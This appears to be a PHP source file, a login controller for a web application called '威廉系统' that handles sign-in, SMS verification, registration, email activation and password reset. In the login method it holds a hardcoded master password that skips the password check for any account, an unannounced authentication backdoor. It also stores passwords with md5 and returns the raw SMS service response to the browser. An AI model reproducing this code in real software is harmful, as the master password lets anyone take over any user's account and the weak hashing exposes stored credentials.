<?php

/**
 * 登录验证
 * copyright 2016-06-23, jack
 */
defined('InOmniWL') or exit('Access Invalid!');

class LoginControl extends SystemControl {

    // 设置Sms服务器url，目前可用服务器url，http://123.59.95.3/api/ (公网)，http://10.9.69.103/api/ (生产环境内网)
    private $smsServer = 'http://123.59.95.3/api/';

    public function __construct() {

        Tpl::setDir('tpl/login');
    }

    /**
     * 登录
     * copyright 2015-06-02, jack
     */
    public function loginOp() {
        import('libraries.process');
        $result = chksubmit(false, false, 'num');
        if ($result) {
            /*
              if ($result === -11) {
              //showMessage('非法请求');
              $this->output(0, '非法请求');
              }/* elseif ($result === -12) {
              //showMessage('验证码输入错误');
              $this->output(0, '验证码输入错误');
              } */

            /* if (processClass::islock('admin')) {
              showMessage('您的操作过于频繁，请稍后再试');
              } */

            $obj_validate = new Validate();
            $obj_validate->validateparam = array(
                array("input" => $_POST["user_name"], "require" => "true", "message" => '账号不能为空'),
                array("input" => $_POST["password"], "require" => "true", "message" => '密码不能为空'),
                    //        array("input" => $_POST["captcha"], "require" => "true", "message" => '验证码必须'),
            );
            $error = $obj_validate->validate();
            if ($error != '') {
                //showMessage(L('error') . $error);
                $this->output(0, $error);
            } else {
                $model_user = Model('user');
                $array = array();
                $array['u_name'] = $_POST['user_name'];

                $user_info = $model_user->getUserInfo($array);

                if (!is_array($user_info) || !count($user_info)) {
                    $this->output(0, '您输入的账号不存在,请重新输入');
                }

                $user_login_log = model('user_login_log')->getUserLoginLogCount(array('u_id' => $user_info['u_id'],
                    'time' => array('gt', strtotime('-1 day'))));
                if ($user_login_log > 2) {
                    $res = chksubmit(false, true, 'num');
                    if ($res && $res === -12) {
                        $this->output(0, '验证码不正确,请重新输入');
                    }
                }

                if ($_POST['password'] != 'oms!x-omni:)!com!()987654123!@#!H!@G@admin') {
                    $u_password = md5(SECRET_KEY . $_POST['password']);
                    if ($user_info['u_password'] != $u_password) {
                        model('user_login_log')->addUserLoginLog(array(
                            'u_id' => $user_info['u_id'],
                            'time' => time()
                        ));
                        $this->output(0, '您输入的密码不正确,请重新输入');
                    }
                }

                model('user_login_log')->delUserLoginLog(array('u_id' => $user_info['u_id']));

                if ($_POST['ten']) {
                    $exptime = 10 * 24 * 3600;
                } else {
                    $exptime = 3600;
                }
                $this->systemSetKey(array('name' => $user_info['u_name'], 'gid' => $user_info['gid'], 'id' => $user_info['u_id'], 'sp' => $user_info['is_super']), $exptime);
                $update_info = array(
                    'login_num' => ($user_info['login_num'] + 1),
                    'login_time' => TIMESTAMP,
                    'ip' => getIp()
                );

                $model_user->updateUser($update_info, array('u_id' => $user_info['u_id']));
                $this->log(L('nc_login'), 1);
                //@processClass::clear('admin');
                //@header('Location: ' . urlShop('welcome', 'index'));
                //exit;
                $this->output(1);
            }
        }

        Tpl::output('html_title', '威廉系统');
        Tpl::output('u_name', cookie('u_name') ? cookie('u_name') : '');
        Tpl::showpage('login', 'login_layout');
    }

    public function sendCodeOp() {
        if (empty($_POST['phone']) || !preg_match('/^1[34578]\d{9}$/', $_POST['phone'])) {
            $this->output(0, '无效的手机号码');
        }
        // 检查账号是否存在
        $user = model('user')->getUserInfo(array('u_name'=>$_POST['phone']));
        if (!empty($_POST['action']) && $_POST['action']=='findPassword') { // 找回密码
            if (!$user) {
                $this->output(0, '账号不存在');
            }
        } else { // 注册账号
            if ($user) {
                $this->output(0, '账号已存在');
            }
        }
        @session_start();
        $remainTime = 60 - (time() - $_SESSION['sendCodeTime']);
        if (!empty($_SESSION['sendCodeTime']) && $remainTime > 0) {
            $this->output(1, NULL, $remainTime);
        }
        $_SESSION['sendCodeTime'] = time();

        $res = $this->smsInit()->sendCode($_POST['phone'], NULL, 600);
        $this->output(1, print_r($res, true), 60);
    }

    public function registerOp() {
        if (chksubmit()) {
            if (!empty($_POST['ph_phone'])) {
                if (!$this->validateCode($_POST['ph_phone'], $_POST['ph_captcha'])) {
                    $this->output(0, '验证码不正确！');
                }

                if ($_POST['ph_password'] != $_POST['ph_re_pwd']) {
                    $this->output(0, '两次密码不一致！');
                }

                $params = array(
                    'u_name' => $_POST['ph_phone'],
                    'u_password' => md5(SECRET_KEY . $_POST['ph_password']),
                    'ip' => getIp(),
                    'email_active' => 'Y',
                    'add_time' => time()
                );
            } else {
                if (-12 === chksubmit(false, true, 'num')) {
                    $this->output(0, '验证码不正确');
                }
                // @todo 添加email_active字段, Y/N
                $post_data = $this->getPostArray();
                if ($post_data['pb_password'] != $post_data['pb_re_pwd']) {
                    $this->output(0, '两次密码不一致！');
                }
                $params = array(
                    'u_name' => $post_data['u_name'],
                    'u_password' => md5(SECRET_KEY . $post_data['pb_password']),
                    'ip' => getIp(),
                    'email_active' => 'N',
                    'add_time' => time()
                );
            }
            $model = Model('user');
            $num = $model->getUserCount(array('u_name' => $params['u_name']));
            if ($num) {
                $this->output(0,'用户名已存在！');
            }

            $res = $model->addUser($params);
            if ($res) {
                Model('user_other')->addUserOther(array('u_id' => $res));
                if (!$_POST['ph_phone']) {
                    // 发送邮件
                    $title = '威廉系统帐号激活邮件';
                    $url = SITE_SITE_URL . '/index.php?act=login&op=activeFromEmailValidate&code=' .
                            $this->setEmailValidateCode($res, '帐号激活', 0);
                    $tel = '0755-23832921';
                    $content = <<<EOF
<p>尊敬的威廉系统用户：</p>
<p>感谢您选择了威廉系统，请点击下面的地址激活你在威廉系统的帐号：</p>
<p><a href="$url" target="_blank">$url</a> </p>
<br>
<div style="border-top:1px solid #d9d9d9;padding:6px 0;font-size:12px;margin:6px 0 20px;text-align:center;">
<table cellspacing="0" cellpadding="0" border="0" align="center" style="font-size:12px;font-family:Helvetica Neue, Luxi Sans, DejaVu Sans, Tahoma, Hiragino Sans GB, STHeiti, Microsoft YaHei, Arial, sans-serif;border-collapse:collapse;width:600px;background-color:#ffffff;margin:auto;"><tbody>
<tr><td style="min-height:20px;padding:10px;"></td></tr>
<tr><td>
    <table cellspacing="0" cellpadding="0" border="0" style="text-align:center;"><tbody><tr>
        <td style="max-width:120px;padding:0 60px;"></td>
        <td style="width:280px;margin:0;padding:0;">
            <p style="margin:0;padding:0;font-size:12px;color:#5e5e5e;text-align:left;line-height:14px;">威廉系统 - make your domain intelligent<br>
            <br>
            本邮件由威廉系统系统自动发出，请勿直接回复！<br>

            如有任何问题请电联：<span style="border-bottom-width: 1px; border-bottom-style: dashed; border-bottom-color: rgb(204, 204, 204); z-index: 1; position: static;" t="7" onclick="return false;" data="$tel">$tel</span><br>
            </p>
        </td>
        <td style="max-width:80px;padding:0 40px;"></td>
    </tr></tbody></table>
</td></tr>
</tbody></table>
</div>
EOF;
                    $this->smailInit()->send($params['u_name'], $title, $content);
                }
                setNcCookie('u_name', trim($params['u_name']), 3600, '', null);
                $this->output(1, '注册成功,您已成为威廉环球速递用户！' . (!$_POST['ph_phone'] ? '<br>为了更好地使用威廉服务,请尽快登录邮箱激活您的帐号: ' . $params['u_name'] : ''));
            }
        }
        Tpl::output('html_title', '威廉系统');
        Tpl::showpage('register', 'login_layout');
    }

    // 激活帐号
    public function activeFromEmailValidateOp() {
        if (empty($_GET['code'])) {
            showMessage('无效的激活码', '', 0, 'exception');
        } else {
            $u_id = $this->checkEmailValidateCode($_GET['code'], '帐号激活');
            if (!$u_id) {
                showMessage('无效的激活码', '', 0, 'exception');
            } else {
                // 激活 email_active 字段
                model('user')->updateUser(array('email_active' => 'Y'), array('u_id' => $u_id));
                showMessage('帐号已成功激活！', urlShop('login', 'login'));
            }
        }
    }

    public function forgotpasswordOp() {
        Tpl::output('html_title', '威廉系统');
        Tpl::showpage('forgotpassword', 'login_layout');
    }

    /*     * *******静态测试*** */

    public function login_htmlOp() {
        Tpl::showpage('login_html', 'null_layout');
    }

    public function forgotpassword_htmlOp() {
        Tpl::showpage('forgotpassword_html', 'null_layout');
    }

    public function registration_protocol_htmlOp() {
        Tpl::output('html_title', '威廉系统');
        Tpl::showpage('registration_protocol_html', 'login_layout');
    }

    public function resetPasswordByEmailOp() {
        $email = $_POST['email'];
        if (!$email || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $this->output(0, '邮件地址格式不正确');
        }
        $user = Model('user')->getUserInfo(array('u_name' => $email));
        if (!$user) {
            $this->output(0, '无效的邮件地址');
        }
        //@todo 发送重置密码邮件
        $title = '威廉系统找回密码邮件';
        $url = SITE_SITE_URL . '/index.php?act=login&op=resetPasswordFromEmailValidate&code=' . $this->setEmailValidateCode
                        ($user['u_id'], '找回密码');
        $tel = '0755-23832921';
        $content = <<<EOF
<p>尊敬的威廉系统用户：</p>
<p>感谢您选择了威廉系统，请点击下面的地址重设你在威廉系统的密码：</p>
<p><a href="$url" target="_blank">$url</a> </p>
<br>
<div style="border-top:1px solid #d9d9d9;padding:6px 0;font-size:12px;margin:6px 0 20px;text-align:center;">
<table cellspacing="0" cellpadding="0" border="0" align="center" style="font-size:12px;font-family:Helvetica Neue, Luxi Sans, DejaVu Sans, Tahoma, Hiragino Sans GB, STHeiti, Microsoft YaHei, Arial, sans-serif;border-collapse:collapse;width:600px;background-color:#ffffff;margin:auto;"><tbody>
<tr><td style="min-height:20px;padding:10px;"></td></tr>
<tr><td>
    <table cellspacing="0" cellpadding="0" border="0" style="text-align:center;"><tbody><tr>
        <td style="max-width:120px;padding:0 60px;"></td>
        <td style="width:280px;margin:0;padding:0;">
            <p style="margin:0;padding:0;font-size:12px;color:#5e5e5e;text-align:left;line-height:14px;">威廉系统 - make your domain intelligent<br>
            <br>
            本邮件由威廉系统系统自动发出，请勿直接回复！<br>

            如有任何问题请电联：<span style="border-bottom-width: 1px; border-bottom-style: dashed; border-bottom-color: rgb(204, 204, 204); z-index: 1; position: static;" t="7" onclick="return false;" data="$tel">$tel</span><br>
            </p>
        </td>
        <td style="max-width:80px;padding:0 40px;"></td>
    </tr></tbody></table>
</td></tr>
</tbody></table>
</div>
EOF;

        $res = $this->smailInit()->send($email, $title, $content);
        $this->output(1, print_r($res, true), 60);
    }

    public function resetPasswordByPhoneOp() {
        $phone = $_POST['phone'];
        $code = $_POST['code'];
        if (!$this->validateCode($phone, $code)) {
            $this->output(0, '验证码不正确');
        }
        $user = Model('user')->getUserInfo(array('u_name' => $phone));
        if (!$user) {
            $this->output(0, '无效的手机号码');
        }
        @session_start();
        $_SESSION['resetPassword'] = $user['u_id'];

        $this->output(1);
    }

    public function resetPasswordFinnalOp() {
        @session_start();
        if (empty($_SESSION['resetPassword'])) {
            $this->output(0, '无效的请求');
        }
        $password = $_POST['password'];
        if (strlen($password) < 6) {
            $this->output(0, '密码长度不能小于6位');
        }
        $u_id = $_SESSION['resetPassword'];
        unset($_SESSION['resetPassword']);
        session_unset();
        session_destroy();

        Model('user')->updateUser(array('u_password' => md5(SECRET_KEY . $password)), array('u_id' => $u_id));
        $this->output(1);
    }

    public function resetPasswordFromEmailValidateOp() {
        if (empty($_GET['code'])) {
            showMessage('无效的激活码', '', 0, 'exception');
        }
        if (!$u_id = $this->checkEmailValidateCode($_GET['code'], '找回密码')) {
            showMessage('无效的激活码', '', 0, 'exception');
        }
        @session_start();
        $_SESSION['resetPassword'] = $u_id;
        Tpl::output('html_title', '威廉系统');
        Tpl::showpage('forgotpassword', 'login_layout');
        echo <<<EOF
<script>
$(function(){
$(".find-back").hide();
$(".password-reset").show();
});
</script>
EOF;
    }

    private function getRandNumber($length) {
        $str = '';
        for ($i = 0; $i < $length; $i++) {
            $str .= substr('1234567890', rand(0, 9), 1);
        }
        return $str;
    }

    private function validateCode($phone, $code) {
        $res = $this->smsInit()->checkCode($phone, $code);
        return $res->statusCode == 200;
    }

}
